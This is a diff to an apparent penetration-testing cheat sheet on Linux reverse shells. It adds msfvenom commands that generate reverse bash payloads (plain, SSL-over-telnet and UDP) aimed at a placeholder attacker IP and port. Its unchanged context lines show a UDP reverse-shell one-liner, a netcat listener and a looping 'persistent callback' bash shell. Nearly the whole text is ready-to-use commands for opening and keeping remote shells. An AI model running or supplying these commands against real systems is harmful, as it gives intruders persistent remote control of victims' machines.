@@ -32,7 +32,17 @@ $ nohup 0<&103-;exec 103<>/dev/udp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/n
 userware@hackware-os:~$ nc -luvp <LPORT>
 ```
 
-## 03 - Persistent Callback Shell
+## 03 - Generate via `msfvenom`
+
+```
+$ msfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<PORT>
+
+$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
+
+$ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>
+```
+
+## 04 - Persistent Callback Shell
 
 - In case you might lose the callback connection. It's better to make it persistent.
 
@@ -45,6 +55,6 @@ $ while true; do /bin/bash -i >& /dev/<protocol>/<IP>/<LPORT> 0>&1; sleep 10;
 ---
 ## References
 
-- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
+- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
 
-- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
